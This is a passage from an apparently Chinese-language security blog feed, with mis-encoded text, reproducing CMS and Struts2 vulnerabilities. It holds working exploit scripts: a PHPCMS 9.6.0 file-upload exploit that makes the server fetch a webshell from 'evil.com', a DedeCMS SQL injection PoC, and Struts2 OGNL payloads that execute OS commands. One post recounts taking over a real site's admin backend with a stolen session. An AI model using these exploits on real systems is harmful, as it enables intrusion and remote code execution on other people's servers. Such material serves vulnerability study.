False#,{&quot;http&quot;:&quot;socks5://127.0.0.1:1080&quot;}print(poc(&quot;http://127.0.0.1/cms/phpcms/9.6.0/&quot;))</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcmsæ¼æ´åˆ†æåˆé›†</a></p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQLæ³¨å…¥/">http://blog.ccreater.top/2020/02/13/phpcmsv9.6.0SQLæ³¨å…¥/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°</title>
      <link href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="phpcmsv9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#phpcmsv9-6-0ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="phpcmsv9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>phpcmsv9.6.0ä»»æ„æ–‡ä»¶ä¸Šä¼ </h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>phpcms v9.6.0</p><p>å¼€å¯ç”¨æˆ·æ³¨å†ŒåŠŸèƒ½</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ ¹æ®ç½‘ç»œä¸Šæä¾›çš„pocè¿›è¡Œæ¼æ´å¤ç°:</p><pre><code class="python">import reimport requestsdef poc(url):    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)    data = {        &#39;siteid&#39;: &#39;1&#39;,        &#39;modelid&#39;: &#39;1&#39;,        &#39;username&#39;: &#39;test&#39;,        &#39;password&#39;: &#39;testxx&#39;,        &#39;email&#39;: &#39;test@test.com&#39;,        &#39;info[content]&#39;: &#39;&lt;img src=http://url/shell.txt?.php#.jpg&gt;&#39;,        &#39;dosubmit&#39;: &#39;1&#39;,    }    rep = requests.post(u, data=data)    shell = &#39;&#39;    re_result = re.findall(r&#39;&amp;lt;img src=(.*)&amp;gt&#39;, rep.content)    if len(re_result):        shell = re_result[0]        print shell</code></pre><p>æ¼æ´çš„å…³é”®ä½ç½®</p><p><code>phpcms/modules/member/index.php</code>:135</p><pre><code class="php">if($member_setting[&#39;choosemodel&#39;]) {    require_once CACHE_MODEL_PATH.&#39;member_input.class.php&#39;;    require_once CACHE_MODEL_PATH.&#39;member_update.class.php&#39;;    $member_input = new member_input($userinfo[&#39;modelid&#39;]);            $_POST[&#39;info&#39;] = array_map(&#39;new_html_special_chars&#39;,$_POST[&#39;info&#39;]);    $user_model_info = $member_input-&gt;get($_POST[&#39;info&#39;]);                                        }</code></pre><p><code>$_POST[&#39;info&#39;]</code>è¢«<code>new_html_special_chars</code>å¤„ç†å,ç›´æ¥ä½œä¸ºå‚æ•°ä¼ å…¥<code>$member_input-&gt;get</code></p><p>è·Ÿè¿›å»å‘ç°</p><pre><code class="php">if(is_array($data)) {            foreach($data as $field=&gt;$value) {                ...                $field = safe_replace($field);                ...                $func = $this-&gt;fields[$field][&#39;formtype&#39;];                if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);                $info[$field] = $value;            }        }</code></pre><p><code>$this-&gt;$func($field, $value);</code>ä»¤äººæµ®æƒ³è”ç¿©çš„å‘½ä»¤,è€Œ<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>,å…¶ä¸­<code>$field</code>æ˜¯æˆ‘ä»¬å¯æ§çš„è¾“å…¥<code>new_html_special_chars($_POST[&#39;info&#39;]) as $field=&gt;$value</code></p><p>è€Œ<code>$this-&gt;fields[$field][&#39;formtype&#39;];</code>æœ‰ä»¥ä¸‹å–å€¼,æˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¶æ‰§è¡ŒæŸä¸€å‡½æ•°</p><pre><code class="php">$this-&gt;fields[&#39;catid&#39;][&#39;formtype&#39;]=&quot;catid&quot;$this-&gt;fields[&#39;typeid&#39;][&#39;formtype&#39;]=&quot;typeid&quot;$this-&gt;fields[&#39;title&#39;][&#39;formtype&#39;]=&quot;title&quot;$this-&gt;fields[&#39;keywords&#39;][&#39;formtype&#39;]=&quot;keyword&quot;$this-&gt;fields[&#39;copyfrom&#39;][&#39;formtype&#39;]=&quot;copyfrom&quot;$this-&gt;fields[&#39;description&#39;][&#39;formtype&#39;]=&quot;textarea&quot;$this-&gt;fields[&#39;updatetime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;$this-&gt;fields[&#39;content&#39;][&#39;formtype&#39;]=&quot;editor&quot;$this-&gt;fields[&#39;thumb&#39;][&#39;formtype&#39;]=&quot;image&quot;$this-&gt;fields[&#39;relation&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;$this-&gt;fields[&#39;pages&#39;][&#39;formtype&#39;]=&quot;pages&quot;$this-&gt;fields[&#39;inputtime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;$this-&gt;fields[&#39;posids&#39;][&#39;formtype&#39;]=&quot;posid&quot;$this-&gt;fields[&#39;groupids_view&#39;][&#39;formtype&#39;]=&quot;groupid&quot;$this-&gt;fields[&#39;voteid&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;$this-&gt;fields[&#39;islink&#39;][&#39;formtype&#39;]=&quot;islink&quot;$this-&gt;fields[&#39;url&#39;][&#39;formtype&#39;]=&quot;text&quot;$this-&gt;fields[&#39;listorder&#39;][&#39;formtype&#39;]=&quot;number&quot;$this-&gt;fields[&#39;template&#39;][&#39;formtype&#39;]=&quot;template&quot;$this-&gt;fields[&#39;allow_comment&#39;][&#39;formtype&#39;]=&quot;box&quot;$this-&gt;fields[&#39;status&#39;][&#39;formtype&#39;]=&quot;box&quot;$this-&gt;fields[&#39;readpoint&#39;][&#39;formtype&#39;]=&quot;readpoint&quot;$this-&gt;fields[&#39;username&#39;][&#39;formtype&#39;]=&quot;text&quot;</code></pre><p>ä¸€ä¸ªä¸€ä¸ªæŸ¥çœ‹æœ€åå‘ç°:</p><pre><code class="php">    function editor($field, $value) {        $setting = string2array($this-&gt;fields[$field][&#39;setting&#39;]);        $enablesaveimage = $setting[&#39;enablesaveimage&#39;];        $site_setting = string2array($this-&gt;site_config[&#39;setting&#39;]);        $watermark_enable = intval($site_setting[&#39;watermark_enable&#39;]);        $value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);        return $value;    }</code></pre><p><code>editor</code>ä¼šè°ƒç”¨downloadæ–¹æ³•,å…¶ä¸­<code>$field</code>å’Œ<code>$value</code>éƒ½æ˜¯å¯æ§çš„</p><p>è·Ÿè¿›<code>download</code>:</p><pre><code class="php">function download($field, $value,$watermark = &#39;0&#39;,$ext = &#39;gif|jpg|jpeg|bmp|png&#39;, $absurl = &#39;&#39;, $basehref = &#39;&#39;)    {        global $image_d;        $this-&gt;att_db = pc_base::load_model(&#39;attachment_model&#39;);        $upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);        $this-&gt;field = $field;        $dir = date(&#39;Y/md/&#39;);        $uploadpath = $upload_url.$dir;        $uploaddir = $this-&gt;upload_root.$dir;        $string = new_stripslashes($value);        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;        $remotefileurls = array();        foreach($matches[3] as $matche)        {            if(strpos($matche, &#39;://&#39;) === false) continue;            dir_create($uploaddir);            $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);        }        unset($matches, $string);        $remotefileurls = array_unique($remotefileurls);        $oldpath = $newpath = array();        foreach($remotefileurls as $k=&gt;$file) {            if(strpos($file, &#39;://&#39;) === false || strpos($file, $upload_url) !== false) continue;            $filename = fileext($file);            $file_name = basename($file);            $filename = $this-&gt;getname($filename);            $newfile = $uploaddir.$filename;            $upload_func = $this-&gt;upload_func;            if($upload_func($file, $newfile)) {                $oldpath[] = $k;                $GLOBALS[&#39;downloadfiles&#39;][] = $newpath[] = $uploadpath.$filename;                @chmod($newfile, 0777);                $fileext = fileext($filename);                if($watermark){                    watermark($newfile, $newfile,$this-&gt;siteid);                }                $filepath = $dir.$filename;                $downloadedfile = array(&#39;filename&#39;=&gt;$filename, &#39;filepath&#39;=&gt;$filepath, &#39;filesize&#39;=&gt;filesize($newfile), &#39;fileext&#39;=&gt;$fileext);                $aid = $this-&gt;add($downloadedfile);                $this-&gt;downloadedfiles[$aid] = $filepath;            }        }        return str_replace($oldpath, $newpath, $value);    }    </code></pre><p><code>download</code>ç”¨<code>$upload_func($file, $newfile)</code>æ¥ä¸‹è½½æ–‡ä»¶åˆ°æœåŠ¡å™¨,è€Œ<code>$upload_func=&quot;copy&quot;</code></p><p>æˆ‘ä»¬åˆ†æä¸€ä¸‹<code>download</code>å‡½æ•°,<code>$file</code>å’Œ<code>$newfile</code>ç»è¿‡çš„å¤„ç†</p><p><code>$file</code>æ˜¯<code>$remotefileurls</code>ä¸­çš„å€¼</p><pre><code class="php">        $string = new_stripslashes($value);//åè½¬ä¹‰        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;        $remotefileurls = array();        foreach($matches[3] as $matche)        {            if(strpos($matche, &#39;://&#39;) === false) continue;            dir_create($uploaddir);            $remotefileurls[$matche] = $this-&gt;fillurl($matche, &#39;&#39;, &#39;&#39;);        }</code></pre><p>è·Ÿè¿›<code>$this-&gt;fillurl</code>,å¤§æ¦‚åŠŸèƒ½æ˜¯,å»æ‰url<code>#</code>åé¢çš„ä¸œè¥¿</p><pre><code class="php">function fillurl($surl, $absurl, $basehref = &#39;&#39;) {        ...        $pos = strpos($surl,&#39;#&#39;);        if($pos&gt;0) $surl = substr($surl,0,$pos);        ...    }</code></pre><p>æ„é€ <code>$value=&#39;src=http://evil.com/evil.php#.jpg&#39;</code></p><p>æˆ‘ä»¬å†çœ‹ä¸‹<code>$newfile</code></p><pre><code class="php">$dir = date(&#39;Y/md/&#39;);$uploaddir = $this-&gt;upload_root.$dir;$filename = fileext($file);$filename = $this-&gt;getname($filename);$newfile = $uploaddir.$filename;</code></pre><p><code>$this-&gt;getname</code>:</p><pre><code class="php">function getname($fileext){        return date(&#39;Ymdhis&#39;).rand(100, 999).&#39;.&#39;.$fileext;    }</code></pre><p>webshellçš„åœ°å€ä¸º:<code>http://website/uploadfile/date(&#39;Y/md/&#39;)/date(&#39;Ymdhis&#39;).rand(100, 999).php</code></p><p>æœ€åpayloadä¸º:</p><pre><code>/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1post:info[content]=&lt;img src=&quot;http://evil.com/evil.php&quot;&gt;</code></pre><h2 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h2><pre><code class="python">import reimport requestsimport randomdef exp(url,evilurl=&quot;http://xxxxxxx/evil.php&quot;):    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)    data = {        &#39;siteid&#39;: &#39;1&#39;,        &#39;modelid&#39;: &#39;1&#39;,        &#39;username&#39;: &#39;test%d&#39;%random.randint(1,999999),        &#39;password&#39;: &#39;testxx&#39;,        &#39;email&#39;: &#39;test%d@test.com&#39;%random.randint(1,999999),        &#39;info[content]&#39;: &#39;src=%s#.jpg&#39;%evilurl,        &#39;dosubmit&#39;: &#39;1&#39;,    }    rep = requests.post(u, data=data)    result=re.search(r&quot;VALUES \(&#39;src=(.*)&#39;,&#39;\d*&#39;\)&quot;,rep.text).groups()    print(rep.text)    print(result)exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/12/phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°/">http://blog.ccreater.top/2020/02/12/phpcms960ä»»æ„æ–‡ä»¶ä¸Šä¼ å¤ç°/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡æ¼æ´æŒ–æ˜</title>
      <link href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h1 id="æ— æ ‡é¢˜"><a href="#æ— æ ‡é¢˜" class="headerlink" title="æ— æ ‡é¢˜"></a>æ— æ ‡é¢˜</h1><p>æŸä¸ªæœˆé»‘é£é«˜çš„æ™šä¸Š,æˆ‘çªç„¶æƒ³èµ·äº†æˆ‘çš„å¤å¤æ¸¸æˆæœºè¿˜å·®ä¸€ç‚¹åº“å¸,äºæ˜¯å†³å®šå»æŒ–ä¸ªæ´ â€¦â€¦.</p><p>ç»è¿‡ä¸€ç•ªæƒ¨ç»äººå¯°,æ¬²ç½¢ä¸èƒ½çš„ä¿¡æ¯æ”¶é›†å,æˆ‘å¼€å§‹äº†fuzz,ç„¶å ipè¢«ban:(</p><p>ä¸»è¦çš„ä¿¡æ¯ä¸º:</p><pre><code>dedecms 5.7sp1 20150618ZOHO ManageEngine OpManageradminer 4.6.3</code></pre><p>çˆ†ç ´å¯†ç ,fuzzæ–‡ä»¶å•¥çš„éƒ½å¹²è¿‡,dedecmsçš„åå°ä¹Ÿæ²¡çˆ†å‡ºæ¥,ä½†æ˜¯å‘ç°ä»–ä»¬æœåŠ¡å™¨é…ç½®é”™è¯¯,å¯ä»¥æµè§ˆç›®å½•</p><p>æŠŠè¯¥ç‰ˆæœ¬çš„dedecmsä¹‹åçš„æ›´æ–°å¯¹æ¯”äº†ä»¥ä¸‹,æ²¡å‘ç°æœ‰å•¥æ´,æ­¤æ—¶å°±é™·å…¥äº†åƒµå±€</p><p>ä½†æ˜¯,æˆ‘éšæ‰‹ç‚¹äº†ä¸€ä¸ª<code>en</code>çš„è¶…é“¾æ¥,å°±å‘ç°äº†ä¸€ä¸ªæ–°çš„åŸŸå!!!!</p><p>ç„¶åè¿™ä¸ªåŸŸåä¸‹çš„æœåŠ¡,ä¹Ÿæ˜¯dedecms,è€Œåå°å°±æ˜¯<code>/dede</code></p><p>åˆ©ç”¨å‰é¢å‘ç°çš„ç›®å½•æµè§ˆ,æˆ‘æˆåŠŸæ‹¿åˆ°äº†<code>admin</code>çš„session,ç›´æ¥è¿›å…¥åå°getshell</p><p><strong>ä¸€äº›ç½‘ç«™çš„è‹±æ–‡ç«™ç‚¹å¯èƒ½å°±æ˜¯æˆ‘ä»¬çš„çªç ´å£</strong></p><p>èµ„äº§æ”¶é›†çœŸçš„å¤ªé‡è¦äº†,è¦ä¸æ˜¯è¿™æ¬¡è¿æ°”å¥½,æˆ‘è¿˜ä¸çŸ¥é“å•¥æ—¶å€™èƒ½æ—¥æ‰</p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/11/è®°ä¸€æ¬¡æ¼æ´æŒ–æ˜/">http://blog.ccreater.top/2020/02/11/è®°ä¸€æ¬¡æ¼æ´æŒ–æ˜/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DedeCMS 5.7 plusguestbook.phpæ³¨å…¥æ¼æ´</title>
      <link href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="DedeCMS-5-7-plus-guestbook-php-æ³¨å…¥æ¼æ´"><a href="#DedeCMS-5-7-plus-guestbook-php-æ³¨å…¥æ¼æ´" class="headerlink" title="DedeCMS 5.7 plus/guestbook.php æ³¨å…¥æ¼æ´"></a>DedeCMS 5.7 plus/guestbook.php æ³¨å…¥æ¼æ´</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>æ¼æ´æˆåŠŸéœ€è¦æ¡ä»¶ï¼š</p><ol><li>php magic_quotes_gpc=off</li><li>æ¼æ´æ–‡ä»¶å­˜åœ¨ plus/guestbook.php dede_guestbook è¡¨å½“ç„¶ä¹Ÿè¦å­˜åœ¨ã€‚</li></ol><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>poc:<code>www.xxx.com/plus/guestbook.php?action=admin&amp;job=editok&amp;msg=sebug&#39;&amp;id=å­˜åœ¨çš„ç•™è¨€ID</code></p><p><code>/plus/guestbook.php</code>ä¸­ä¸ºå¯¹èº«ä»½è¿›è¡ŒéªŒè¯:</p><pre><code class="php">if($action==&#39;admin&#39;){    include_once(dirname(__FILE__).&#39;/guestbook/edit.inc.php&#39;);    exit();}</code></pre><p><code>/plus/guestbook/edit.inc.php</code></p><pre><code class="php">if($job==&#39;editok&#39;){    $remsg = trim($remsg);    if($remsg!=&#39;&#39;)    {        //ç®¡ç†å‘˜å›å¤ä¸è¿‡æ»¤HTML        if($g_isadmin)        {            $msg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.$msg.&quot;&lt;/div&gt;\n&quot;.$remsg;             //$remsg &lt;br&gt;&lt;font color=red&gt;ç®¡ç†å‘˜å›å¤ï¼š&lt;/font&gt;        }        else        {            $row = $dsql-&gt;GetOne(&quot;SELECT msg From `#@__guestbook` WHERE id=&#39;$id&#39; &quot;);            $oldmsg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.addslashes($row[&#39;msg&#39;]).&quot;&lt;/div&gt;\n&quot;;            $remsg = trimMsg(cn_substrR($remsg, 1024), 1);            $msg = $oldmsg.$remsg;        }    }     $msg = HtmlReplace($msg, -1);    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);    ShowMsg(&quot;æˆåŠŸæ›´æ”¹æˆ–å›å¤ä¸€æ¡ç•™è¨€ï¼&quot;, $GUEST_BOOK_POS);    exit();}</code></pre><p>å…¶ä¸­:</p><pre><code class="php">$msg = HtmlReplace($msg, -1);    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);</code></pre><p>dedecmsä¸­çš„<code>common.inc.php</code>,æœ‰è¿™æ ·çš„ä¸€æ®µä»£ç </p><pre><code class="php">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)    {        foreach($$_request as $_k =&gt; $_v)         {            if($_k == &#39;nvarname&#39;) ${$_k} = $_v;            else ${$_k} = _RunMagicQuotes($_v);        }    }</code></pre><p>å®ƒå°†<code>_GET</code>,<code>_POST</code>,<code>_COOKIE</code>ä¸­çš„å˜é‡æ”¾å‡ºæ¥,è€Œ<code>_RunMagicQuotes</code></p><pre><code class="php">function _RunMagicQuotes(&amp;$svar){    if(!get_magic_quotes_gpc())    {        ...    }    return $svar;}</code></pre><p>æ‰€ä»¥<code>magic_quotes_gpc=off</code>çš„æƒ…å†µä¸‹ä¾¿ä¼šå¼•èµ·sqlæ³¨å…¥</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://www.seebug.org/vuldb/ssvid-89599" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89599</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š [<a href="http://blog.ccreater.top/2020/02/10/DedeCMS">http://blog.ccreater.top/2020/02/10/DedeCMS</a> 5.7 plusguestbook.phpæ³¨å…¥æ¼æ´/](<a href="http://blog.ccreater.top/2020/02/10/DedeCMS">http://blog.ccreater.top/2020/02/10/DedeCMS</a> 5.7 plusguestbook.phpæ³¨å…¥æ¼æ´/) <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>S2-013_S2-014è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</title>
      <link href="/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="S2-013-S2-014-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#S2-013-S2-014-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="S2-013/S2-014 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>S2-013/S2-014 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h1><h2 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h2><p>structs2  ç‰ˆæœ¬: 2.0.0 - 2.3.14.1 </p><h2 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h2><p>s2-013</p><pre><code>link.action?xxx=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}// æˆ–link.action?xxx=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())}</code></pre><p>s2-014</p><pre><code>http://localhost:8080/S2-013/link.action?xxxx=${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;))}</code></pre><h2 id="æ£€æµ‹è„šæœ¬"><a href="#æ£€æµ‹è„šæœ¬" class="headerlink" title="æ£€æµ‹è„šæœ¬"></a>æ£€æµ‹è„šæœ¬</h2><p>S2-013</p><pre><code class="python">import requestsdef poc(url):    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;    data={        &#39;xxx&#39;:&#39;&#39;&#39;${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;echo structs2_s2-013_vuln_checkflag&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}&#39;&#39;&#39;    }    try :        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})        if &quot;structs2_s2-013_vuln_checkflag&quot; in res.text and res.status_code==200:            return True    except :        pass    return False</code></pre><p>S2-014</p><pre><code class="python">import requestsdef poc(url):    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;    data={        &#39;xxx&#39;:&#39;&#39;&#39;${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;echo structs2_s2-014_vuln_checkflag&quot;))}&#39;&#39;&#39;    }    try :        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})        if &quot;structs2_s2-014_vuln_checkflag&quot; in res.text and res.status_code==200:            return True    except :        pass    return False</code></pre><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/02/08/S2-013_S2-014è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/">http://blog.ccreater.top/2020/02/08/S2-013_S2-014è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> cveå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cveå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´CVE-2017-12615</title>
      <link href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/"/>
      <url>/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/</url>
      
